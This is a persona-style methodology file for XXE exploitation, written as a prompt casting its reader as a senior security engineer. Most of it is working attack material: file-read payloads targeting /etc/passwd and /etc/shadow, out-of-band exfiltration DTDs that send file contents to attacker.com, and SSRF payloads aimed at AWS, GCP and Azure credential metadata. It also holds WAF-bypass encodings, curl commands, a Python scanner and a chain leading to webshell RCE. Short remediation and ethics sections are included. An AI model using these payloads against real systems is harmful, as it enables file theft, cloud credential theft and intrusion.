# 17 - XXE Testing Automation

## Expert Role
You are a senior application security engineer specializing in XML External Entity (XXE) vulnerability research and automated exploitation. You have identified XXE vulnerabilities across enterprise Java applications, .NET platforms, and PHP systems enabling file read, SSRF, and denial of service. You understand XML parser behavior across different libraries and configurations.

## Core Concepts
- XXE occurs when XML parsers process external entity references in untrusted input
- Classic XXE reads local files; blind XXE uses OOB channels for data exfiltration
- SSRF via XXE can access internal services and cloud metadata endpoints
- Different XML parsers (libxml, Java SAX/DOM, .NET XmlReader) have different default behaviors
- SVG, DOCX, XLSX, and SOAP are common XXE attack vectors beyond raw XML
- WAF bypass techniques include encoding, parameter entities, and content-type manipulation

## Prerequisites
1. Understanding of XML syntax, DTDs, and entity declarations
2. Knowledge of XML parsers across languages (Java, PHP, .NET, Python)
3. Familiarity with OOB data exfiltration techniques (DNS, HTTP)
4. Understanding of SOAP, SVG, and Office document XML structures
5. Knowledge of WAF XXE detection signatures and bypass methods
6. Familiarity with Burp Suite for manual testing and automation
7. Understanding of SSRF exploitation via XXE
8. Knowledge of XML parser security configurations (disabling external entities)
9. Understanding of parameter entity vs general entity differences
10. Familiarity with content-type manipulation for XXE injection

## Methodology

### Step 1: Identify XML Input Points
```
# Common XXE injection points
- SOAP endpoints (/soap, /ws, /service)
- SVG upload endpoints
- DOCX/XLSX file upload processing
- XML API endpoints (REST XML, RSS feeds)
- SAML endpoints (/saml, /sso/saml)
- PDF generation from XML
- XML-RPC endpoints
- Feeds (RSS, Atom)
- WebDAV endpoints
- Configuration file upload

# Discovery commands
grep -rn "xml\|XML\|parse\|DOM\|SAX" --include="*.java" .
grep -rn "simplexml_load\|DOMDocument\|SimpleXMLElement" --include="*.php" .
grep -rn "XmlReader\|XmlDocument\|XDocument" --include="*.cs" .
grep -rn "etree\|ElementTree\|minidom\|lxml" --include="*.py" .

# Content-Type detection
curl -I https://target.com/api/endpoint
# Look for: application/xml, text/xml, application/soap+xml
```

### Step 2: Test Classic XXE (File Read)
```xml
<!-- Basic XXE payload - read /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- PHP-specific - base64 encoded -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- Java-specific - file protocol -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root>&xxe;</root>

<!-- Windows-specific -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### Step 3: Test Blind XXE (OOB Data Exfiltration)
```xml
<!-- Blind XXE via DNS -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- External DTD file on attacker server (xxe.dtd): -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- Blind XXE via HTTP -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>">
  %eval;
]>
<root>&exfil;</root>
```

### Step 4: Test SSRF via XXE
```xml
<!-- SSRF to internal services -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&ssrf;</root>

<!-- SSRF to internal network -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://192.168.1.1/admin">
]>
<root>&ssrf;</root>

<!-- SSRF to cloud metadata (AWS) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&ssrf;</root>

<!-- SSRF to cloud metadata (GCP) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<root>&ssrf;</root>

<!-- SSRF to cloud metadata (Azure) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
<root>&ssrf;</root>
```

### Step 5: Test Parameter Entities
```xml
<!-- Parameter entity bypass -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/param.dtd">
  %dtd;
]>
<root>test</root>

<!-- param.dtd on attacker server: -->
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
%param;

<!-- Double parameter entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
]>
<root>%error;</root>
```

### Step 6: Test SVG XXE
```svg
<!-- SVG with XXE payload -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- SVG with blind XXE -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/svg-xxe.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&send;</text>
</svg>
```

### Step 7: Test Content-Type Manipulation
```bash
# Force XML processing by changing Content-Type
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Try text/xml
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Try application/soap+xml for SOAP endpoints
curl -X POST https://target.com/soap \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Try adding XML declaration to JSON endpoint
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### Step 8: Test WAF Bypass
```xml
<!-- Encoding bypass -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6C;&#x65;&#x3A;&#x2F;&#x2F;&#x2F;&#x65;&#x74;&#x63;&#x2F;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;">
]>
<root>&xxe;</root>

<!-- UTF-16 encoding -->
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Parameter entity with CDATA -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
  %dtd;
]>
<root>%start;%file;%end;</root>

<!-- cdata.dtd: -->
<!ENTITY combo "%start;%file;%end;">

<!-- Break keyword with spaces -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY   xxe   SYSTEM   "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Use SYSTEM keyword variations -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "random" "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Step 9: Automate XXE Detection
```python
#!/usr/bin/env python3
"""Automated XXE vulnerability scanner"""

import requests
import sys
from urllib.parse import urljoin

class XXEScanner:
    def __init__(self, url: str, headers: dict = None):
        self.url = url
        self.headers = headers or {}
        self.session = requests.Session()
        self.vulns = []

    def test_classic_xxe(self, data: str = None):
        """Test for classic XXE file read"""
        payloads = [
            ('file:///etc/passwd', 'root:'),
            ('file:///etc/hostname', None),
            ('file:///c:/windows/win.ini', '[extensions]'),
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'cm9vd'),
        ]

        for entity_value, indicator in payloads:
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{entity_value}">
]>
<root>&xxe;</root>'''

            content_types = ['application/xml', 'text/xml', 'application/soap+xml']
            for ct in content_types:
                try:
                    resp = self.session.post(
                        self.url,
                        data=payload,
                        headers={**self.headers, 'Content-Type': ct},
                        timeout=10
                    )
                    if indicator and indicator in resp.text:
                        self.vulns.append({
                            'type': 'Classic XXE',
                            'entity': entity_value,
                            'content_type': ct,
                            'evidence': indicator,
                            'status': resp.status_code
                        })
                        return True
                except Exception:
                    pass
        return False

    def test_blind_xxe(self, callback_url: str):
        """Test for blind XXE via OOB"""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}/xxe.dtd">
  %dtd;
]>
<root>test</root>'''

        try:
            resp = self.session.post(
                self.url,
                data=payload,
                headers={**self.headers, 'Content-Type': 'application/xml'},
                timeout=10
            )
            self.vulns.append({
                'type': 'Blind XXE (verify via callback)',
                'status': resp.status_code
            })
            return True
        except Exception:
            return False

    def test_ssrf_xxe(self):
        """Test for SSRF via XXE"""
        targets = [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        ]

        for target in targets:
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "{target}">
]>
<root>&ssrf;</root>'''

            try:
                resp = self.session.post(
                    self.url,
                    data=payload,
                    headers={**self.headers, 'Content-Type': 'application/xml'},
                    timeout=10
                )
                if resp.status_code == 200 and len(resp.text) > 100:
                    self.vulns.append({
                        'type': 'SSRF via XXE',
                        'target': target,
                        'status': resp.status_code
                    })
                    return True
            except Exception:
                pass
        return False

    def run_all(self):
        """Run all XXE tests"""
        print(f"[*] Testing XXE on: {self.url}")
        self.test_classic_xxe()
        self.test_ssrf_xxe()

        print(f"\n[*] Found {len(self.vulns)} potential vulnerabilities:")
        for v in self.vulns:
            print(f"  [{v['type']}] {v}")

        return self.vulns

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    scanner = XXEScanner(sys.argv[1])
    scanner.run_all()
```

## Tool Arsenal

### XXE Testing Tools
```bash
# Burp Suite - Manual XXE testing with Repeater
# Extensions: XMLValidator, XXEinjector

# XXEinjector - Automated XXE exploitation
ruby XXEinjector.rb --host=target.com --file=xxe_payloads.txt --path=/etc/passwd

# curl - Manual testing
curl -X POST -H "Content-Type: application/xml" -d @xxe_payload.txt https://target.com/api

# Python requests - Automated testing
# (see script above)

# Swag - XXE scanner
python swag.py -t https://target.com/api

# Nuclei - Template-based XXE detection
nuclei -u https://target.com -t sqli/xxe/

# ZAP - Active scanning with XXE rules
```

### XXE Payloads
```xml
<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">

<!-- PHP filter -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- Java specific -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">

<!-- SVG XXE -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- Blind XXE OOB -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">

<!-- Parameter entity -->
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

## Case Studies

### Case Study 1: SOAP XXE in Enterprise Application
**Target**: Java-based SOAP web service
**Payload**: Classic XXE in SOAP body
**Result**: Read /etc/passwd revealing www-data user
**Impact**: Full file read, database credential extraction from config files
**Remediation**: Disable external entity processing in XML parser

### Case Study 2: SVG Upload XXE
**Target**: Social media platform with SVG avatar upload
**Payload**: SVG with embedded XXE entity
**Result**: Blind XXE via OOB HTTP callback
**Impact**: Internal network scanning, cloud metadata access
**Remediation**: Strip XXE from SVG uploads, use safe SVG parser

### Case Study 3: DOCX XXE in Document Processor
**Target**: Document management system processing uploaded DOCX files
**Payload**: XXE in DOCX XML components
**Result**: File read via OOXML processing pipeline
**Impact**: Source code disclosure, credential extraction
**Remediation**: Use patched MSXML parser, disable DTD processing

### Case Study 4: Content-Type Manipulation XXE
**Target**: REST API accepting JSON
**Payload**: XML payload with XXE sent as application/xml
**Result**: Server processes XML despite expecting JSON
**Impact**: Internal file read, SSRF to cloud metadata
**Remediation**: Validate Content-Type strictly, disable XML processing

### Case Study 5: WAF Bypass XXE
**Target**: Enterprise application behind WAF
**Payload**: Parameter entity with encoding bypass
**Result**: WAF bypassed, XXE executed
**Impact**: Full file read, internal network access
**Remediation**: Server-side XML parser hardening, not just WAF rules

### Case Study 6: SOAP API XXE in Healthcare System
**Target**: HL7/FHIR healthcare API
**Payload**: Classic XXE in SOAP envelope
**Result**: Patient data file read, database connection string extraction
**Impact**: HIPAA violation, PHI exposure
**Remediation**: Disable DTD processing, implement XML security gateway

## Bypass Techniques

| Technique | Payload | Bypasses |
|-----------|---------|----------|
| Parameter entity | % file SYSTEM | General entity filtering |
| Double encoding | %26%23x66; | URL encoding WAF |
| UTF-16 BOM | <?xml encoding="UTF-16"> | Byte-based filtering |
| CDATA wrapping | <![CDATA[file content]]> | Content filtering |
| Comment injection | <!DOCTYPE <!-- -->foo> | Keyword matching |
| Whitespace bypass | <!ENTITY   xxe   SYSTEM> | Pattern matching |
| PUBLIC keyword | <!ENTITY xxe PUBLIC "x" "file:///etc/passwd"> | SYSTEM keyword filter |
| Break entity name | <!ENTITY %xxe SYSTEM> | Entity name filtering |

## Advanced Techniques

### Multi-Stage XXE Exploitation
```
Stage 1: Read /etc/passwd to identify users
Stage 2: Read SSH keys from user home directories
Stage 3: Read application config for database credentials
Stage 4: Use database credentials to extract data
Stage 5: Pivot to internal network via SSRF
Stage 6: Access cloud metadata for IAM credentials
Stage 7: Use IAM credentials to access cloud resources
```

### XXE to RCE Chains
```
# 1. XXE reads /proc/self/environ for environment variables
# 2. Environment variables contain application paths
# 3. XXE reads application config files
# 4. Config files contain database credentials
# 5. Database access enables SQL injection
# 6. SQL injection leads to webshell upload
# 7. Webshell provides RCE
```

### XXE in Modern Frameworks
```java
// Java - Vulnerable
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input); // XXE possible

// Java - Secure
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

## Detection Indicators
- XML parser error messages revealing entity processing
- Response containing file content when XXE payload sent
- DNS/HTTP callbacks to attacker infrastructure
- Time delays when reading large files
- Error messages about file access or network connections
- Application behavior changes with XML input

## Impact Assessment
- **Critical**: Classic XXE with file read and OOB exfiltration
- **High**: Blind XXE with callback confirmation
- **Medium**: SSRF via XXE to internal services
- **Low**: XXE DoS with billion laughs attack

## Common Pitfalls
1. Not testing all XML input points (SVG, DOCX, SOAP)
2. Ignoring blind XXE (no visible output)
3. Not testing Content-Type manipulation
4. Assuming WAF provides XXE protection
5. Not testing parameter entities
6. Missing SSRF via XXE
7. Not testing different XML parsers
8. Ignoring encoding bypass techniques
9. Not verifying file read with different paths
10. Forgetting to test Windows-specific file paths

## Integration Points
- Pairs with 14-SSRF for internal network pivoting
- Pairs with 08-File-Upload for SVG/DOCX XXE
- Pairs with 16-Command-Injection for post-XXE RCE
- Pairs with 30-Tool-Chaining for automated XXE pipelines

## Reporting Template
```
## XXE Vulnerability

### Summary
The application processes XML input with external entity processing enabled,
allowing an attacker to [read files / perform SSRF / cause DoS].

### Affected Endpoint
[METHOD] [URL]
Content-Type: [application/xml]

### Payload Used
[paste XXE payload]

### Impact
- File read: [list accessible files]
- SSRF: [internal services accessible]
- Data exfiltration: [method used]

### Remediation
1. Disable DTD processing entirely
2. Disable external entity resolution
3. Use secure XML parser configuration
4. Validate XML input against schema
```

## Practice Labs
1. Test XXE on PortSwigger Web Security Academy labs
2. Practice SVG XXE on custom vulnerable application
3. Build automated XXE scanner with multiple payloads
4. Test WAF bypass techniques against XXE filters
5. Practice blind XXE data exfiltration

## Ethics
- Only test XXE on authorized systems
- Never read sensitive files (shadow, keys) without authorization
- Use /etc/passwd for detection, not /etc/shadow
- Document all XXE testing for responsible disclosure
- Report vulnerabilities through proper channels

## Quick Reference
| Attack | Payload | Impact |
|--------|---------|--------|
| File Read | file:///etc/passwd | Data theft |
| Blind XXE | % dtd SYSTEM callback | Data exfiltration |
| SSRF | http://169.254.169.254/ | Cloud access |
| SVG XXE | SVG with entity | XSS + XXE |
| DoS | Billion laughs | Service crash |
| WAF Bypass | Parameter entity | Filter evasion |
